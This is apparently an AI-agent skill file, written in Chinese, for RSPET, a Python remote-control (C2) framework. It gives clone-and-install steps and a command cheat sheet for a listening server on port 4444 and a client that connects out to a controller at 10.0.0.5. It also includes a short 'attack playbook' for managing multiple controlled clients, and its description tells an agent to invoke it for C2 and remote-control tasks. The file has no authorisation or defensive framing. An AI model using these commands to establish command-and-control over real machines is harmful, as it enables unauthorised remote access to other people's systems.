---
name: rspet-c2
description: 渗透工具 skill:RSPET 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架与远控 需要调用 RSPET 时使用。
---

# RSPET

- 攻击大类:C35 C2框架与远控
- 上游仓库:https://github.com/panagiks/RSPET
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/panagiks/RSPET && cd RSPET
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 rspet_server.py -p 4444` | 服务端 |
| `python3 rspet_client.py -H 10.0.0.5 -p 4444` | 客户端 |
| `-e` | 加密 |

## 攻击场景 Playbook

### Python 远控

```bash
python3 rspet_server.py
# 多客户端管理
```

## 注意事项

Python 远控框架。
